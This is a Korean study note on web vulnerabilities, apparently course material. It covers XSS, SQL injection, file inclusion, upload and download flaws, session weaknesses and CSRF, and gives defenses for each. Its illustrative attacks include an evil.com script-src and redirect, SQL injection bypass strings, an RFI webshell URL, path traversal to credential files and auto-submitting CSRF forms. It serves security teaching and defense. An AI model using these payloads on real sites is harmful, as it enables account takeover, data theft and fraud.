# 03. 주요 웹 취약점 — 공격 & 대응

> 각 취약점: 설명 / 공격(진단) 포인트 / 해킹 시나리오 / 보안 대책

---

## 1. 크로스사이트 스크립팅 (XSS)

**설명**: 특정 페이지에 악의적 스크립트를 삽입하여 공격자가 의도한 대로 동작하게 하는 취약점.

**결과**: 사용자 정보(계좌번호·계정·패스워드) 탈취(피싱), 사용자 인증 도용, 악성코드 유포, 브라우저 무한반복. 내부 시스템의 경우 내부 PC 악성코드 감염 시도.

**공격(진단) 포인트**: 사용자 입력 파라미터가 화면에 출력되는 부분 (게시판 내용·제목, 검색어 등 **모든 사용자 입력값**)

**해킹 시나리오**
```
① 악성 스크립트가 삽입된 게시물을 웹 서버에 등록
② 일반 사용자가 해당 게시물 열람
③ 사용자 모르게 PC 내 악성 스크립트 실행
④ 사용자 고유값(쿠키값 등)·중요정보 유출
```

**보안 대책**: 입/출력 값 검증(필터링) 후 사용. 태그 사용이 불가피하면 Keyword 필터링.

| From | To | | From | To |
|:---:|:---:|---|:---:|:---:|
| `<` | `&lt;` | | `&` | `&#38;` |
| `>` | `&gt;` | | `'` | `&#39;` |
| `(` | `&#40;` | | `"` | `&quot;` |
| `)` | `&#41;` | | `#` | `&#35;` |

### 관련 — URL 리다이렉트 변조
악성 사이트로 리다이렉트하는 URL을 생성해 링크 클릭 유도, 또는 인증토큰 발급 시 리다이렉트 도메인을 변조해 정보 도용.
```
http://www.test.com/redirect.jsp?returl=evil.com
http://www.test.com/search.jsp?query=<script src="evil.com">
```
**대응**: 리다이렉트/포워드 시 URL 파라미터 미포함, returnURL이 **WhiteList** 내 정의된 URL인지 검증.

## 2. SQL 인젝션

**설명**: 입력 파라미터 유효성을 점검하지 않아 DB 쿼리 로직이 변경되어 중요 정보 유출(계정정보) 또는 DB 변경을 가하는 공격.

**공격(진단) 포인트**: 게시판 view/write/edit 시 쿼리에 포함되는 파라미터, 첨부파일 다운로드 시 파라미터
```
/view.jsp?...&mbr_id=xx' and 1=2--    ← 거짓 (결과 없음)
/view.jsp?...&mbr_id=xx' and 1=1--    ← 참  (결과 정상) → 취약 판정
```

**해킹 시나리오 (인증 우회)**
```sql
-- 정상 쿼리
SELECT * FROM member WHERE id='' AND pass='';

-- 공격: ID에 [ ' OR 1=1 # ] 입력
SELECT * FROM member WHERE id='' OR 1=1 # AND pass='1234';
--                                  ↑ 항상 참    ↑ # 이후 주석 처리
-- → 인증 우회, 정보 유출/삭제/변경
```

**보안 대책**: 입력되는 모든 값에 유효성 검사, 시스템 명령어로 사용 불가하게 처리. `eval()`, `function()`, `exec()` 미사용.

**필터링 문자**: `'` `"` `=` `<` `>` `(` `)` `union` `select` `drop` `sp_` `xp_` `cmdshell` `--` `#` `;` `%` `\`

## 3. 불충분한 인가

**설명**: 파라미터 값이나 히든 필드를 위조/변조하여 타인의 개인정보 열람·수정, 결제금액 변경 등을 할 수 있는 취약점. 유추 가능한 값(ID, MDN 등)을 인증에 사용할 경우 파라미터 조작으로 개인정보 열람·수정 가능.

**대응방안**
- 상품금액 등 민감 정보는 **암호화된 값** 또는 **상품코드를 통한 DB 조회** 형태로 전달
- 파라미터 값을 신뢰하지 말고 **사용자 권한 체크** 후 페이지 접근 허용
- **2-Factor / 2-Channel** 이상의 인증 구현 (결제·회원정보 수정 등 중요 기능 시 추가 인증 필수)

---

## 4. 경로 추적 (File Inclusion)

| 유형 | 설명 | 예시 |
|------|------|------|
| **RFI (Remote File Inclusion)** | 외부 파일을 URL에 삽입해 웹 서버에서 실행 | `index.php?page=http://abc.com/webshell.php` |
| **LFI (Local File Inclusion)** | 경로 검증 부재로 로컬 파일 경로를 조작해 파일 열람 | `Redirect.do?errorPath=/../classes/jdbc.properties` |

**보안 대책**
- 경로 조작(Path Traversal) 문자 검증, 전체/상대 경로 참조 대신 **인덱싱 값·UUID** 등 참조값 활용
- `include()`, `include_once()`, `require()` 사용 시 입력값 필터링
- Include 페이지 경로를 외부 입력받지 않고 **화이트리스트** 정의값 사용

---

## 5. 파일 업로드

**설명**: 확장자 검증이 없어 악성 파일(웹쉘)을 업로드·실행할 수 있는 취약점.

**공격 포인트**: 게시판 첨부파일, 이미지 삽입 박스, 동영상 첨부 부분

**해킹 시나리오**
```
① 악성 코드 파일(웹쉘) 업로드
② 업로드 파일 절대 경로 파악
③ 절대 경로로 접근하여 실행
④ 서버 시스템 장악 → 내부 시스템·DB 접근
```

**보안 대책**
- **허용된 확장자만** 업로드(Whitelist), 검증 시 **대소문자 구분 없이** 처리
- 파일 타입·크기 제한, 업로드 디렉터리를 웹서버 **document root 외부**에 설정
- 파일 경로·파일명에 `../`, `;`, `%0` 등 특수문자 제한

---

## 6. 파일 다운로드

**설명**: 다운로드 파라미터 검증이 없어 소스파일·시스템 파일을 다운로드할 수 있는 취약점. 경로 인수에 `../` 삽입으로 시스템 디렉터리 파일 다운 가능 (리눅스는 `/etc/passwd` 등).

**공격 포인트**
```
http://www.test.com/../../../../board/dbconn.inc
http://www.test.com/download.asp?path=/board/download/&filename=test.jpg
→ path=../../inc/&file=소스코드파일명  (경로 변조로 소스 유출)
```

**보안 대책**
- 파일 경로를 변수로 쓰지 말고 **키 값(key)** 을 변수로 사용
  ```
  http://www.test.com/download.do?path=5&filename=test.jpg
  ```
- 경로·파일명 변수 사용 시 `../`, `..\`, `.\`, `%` 등 특수문자 필터링

## 7. 취약한 접근 통제 관리

**항목**: 약한 문자열 강도, 취약한 패스워드 복구, 자동화 공격

**대응**: 안전한 패스워드 정책을 **Server Side** 구현, 인증 실패 횟수 제한 (예: 로그인 5회 실패 시 계정 잠금)

---

## 8. 정보 누출 / 관리자 페이지 노출

**항목**: 정보 누출, 관리자 페이지 노출, 위치 공개

**대응**
- 계정명 전체가 노출되지 않도록 **마스킹**
- `admin.html`, `master.asp`, `admin/login.jsp` 등 **유추 가능한 페이지 주소 금지**
- 관리자 페이지는 **별도 서버 분리** 또는 **IP 접근 제어**
- 검색엔진 수집 거부(robots) 설정, 노출 페이지 삭제
- 불필요한 백업·테스트 파일 삭제

---

## 9. 취약한 인증 및 세션 관리

**항목**: 쿠키 변조, 세션 예측, 불충분한 세션 만료, 세션 고정

**대응**
- 쿠키 대신 **Server Side Session**을 인증에 사용
- 중복 로그인 불가하도록 **고유 Key**를 세션값에 포함해 Server Side 검증
  ```
  Key = Hash(TimeStamp | IP Address | User ID | Token)
  ```
- 인증·권한·제어·확인 처리는 **Server Side Language**로 구현
- 비인증 상태로 중요 페이지 접근 차단, 권한 없는 페이지 직접 주소 입력 접근 차단

## 10. 중요 정보 저장/전송 미흡

**항목**: 정보 누출, 데이터 평문 전송 (DB 인증정보 하드코딩, 개인정보 노출, 로그인 평문 전송)

**대응**
- 주요정보(개인·식별·결제정보) **암호화** 또는 확인 불가 문자로 설정
- 데이터 전송 시 **SSL/TLS 적용**으로 통신구간 안정성 확보

## 11. 부적절한 오류 처리

**항목**: 정보 누출 (ID 틀렸을 때 / 비밀번호 틀렸을 때 메시지 차이)

**대응**
- **공통 오류 페이지** 생성 후 오류 시 이동
- 계정·비밀번호 일치 여부에 **일괄적인 오류 메시지** 설정 (계정 존재 여부 노출 방지)

## 12. 취약한 보안설정

## 13. CSRF (Cross-Site Request Forgery) — 사이트 간 요청 위조 ⭐

**설명**: 인증된 사용자(피해자)의 브라우저를 통해 공격자가 의도한 요청을 서버에 강제로 보내는 공격.
사용자 모르게 비밀번호 변경, 계좌이체, 회원탈퇴 등 **상태 변경(State-Changing) 요청**을 유발한다.

> **XSS vs CSRF 비교**
> | | XSS | CSRF |
> |---|---|---|
> | 공격 대상 | 서버(사이트)를 신뢰하는 **사용자** | 사용자를 신뢰하는 **서버** |
> | 핵심 원리 | 악성 스크립트를 피해자 브라우저에서 실행 | 피해자의 인증 쿠키를 이용해 위조 요청 전송 |
> | 스크립트 필요 여부 | 필요 | 불필요 (img 태그 하나로도 가능) |
> | 탈취 대상 | 쿠키·세션·개인정보 | 서버 상의 상태(계좌잔고·설정 등) |

**공격(진단) 포인트**: 로그인 세션이 유지된 채로 처리되는 모든 **쓰기·변경·삭제 요청** (비밀번호 변경, 이체, 관리자 기능)

**해킹 시나리오**
```
① 공격자가 악성 페이지(또는 이메일) 제작
   - <img src="https://bank.com/transfer?to=attacker&amount=1000000">
   - 또는 자동 제출되는 <form action="..." method="POST">

② 피해자가 bank.com에 로그인된 상태로 악성 페이지 방문
   ↓
③ 피해자 브라우저가 (모르는 사이에) bank.com으로 요청 전송
   - 브라우저가 자동으로 세션 쿠키를 첨부
   ↓
④ 서버는 정상 인증된 요청으로 판단 → 이체 실행
```

**CSRF 공격 코드 예시**
```html
<!-- GET 방식 (이미지 태그 활용) -->
<img src="http://target.com/changepass?new=hacked123" width="0" height="0">

<!-- POST 방식 (자동 제출 폼) -->
<form id="csrf" action="http://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **CSRF Token** | 서버가 폼마다 예측 불가 토큰 발급 → 요청 시 토큰 검증 (가장 일반적) |
| **SameSite 쿠키** | `Set-Cookie: session=...; SameSite=Strict` — 외부 사이트에서 쿠키 전송 차단 |
| **Referer 검증** | 요청 헤더의 `Referer`가 자신의 도메인인지 확인 (우회 가능성 있어 보조 수단) |
| **이중 쿠키 검증** | 쿠키 값을 파라미터로도 전달, 서버에서 두 값 일치 여부 확인 |
| **CAPTCHA / 재인증** | 중요 작업(이체·비밀번호 변경) 시 재인증 요구 |
| **Custom Request Header** | AJAX 요청에 `X-Requested-With: XMLHttpRequest` 헤더 추가 (기본 폼 요청에는 미포함) |

**CSRF Token 동작 원리**
```
① 서버: 로그인 시 세션에 CSRF 토큰 저장, 폼에 hidden 필드로 삽입
   <input type="hidden" name="csrf_token" value="a8f3b9...">

② 클라이언트: 폼 제출 시 토큰 함께 전송

③ 서버: 세션의 토큰과 전달된 토큰 일치 여부 검증
   ✅ 일치 → 요청 처리
   ❌ 불일치 → 요청 거부 (403)

④ 공격자는 피해자의 토큰값을 모르기 때문에 위조 요청 실패
```

💬 **강사 보충**
> CSRF는 피해자가 로그인 상태여야 성립한다. 로그아웃하면 자동 방어됨.
> SameSite=Strict가 가장 강력하지만, OAuth처럼 외부 리다이렉트를 활용하는 서비스에선 `Lax`로 완화해야 한다.
> CSRF Token은 세션별이 아니라 **요청별**로 새로 발급해야 replay 공격을 막을 수 있다.
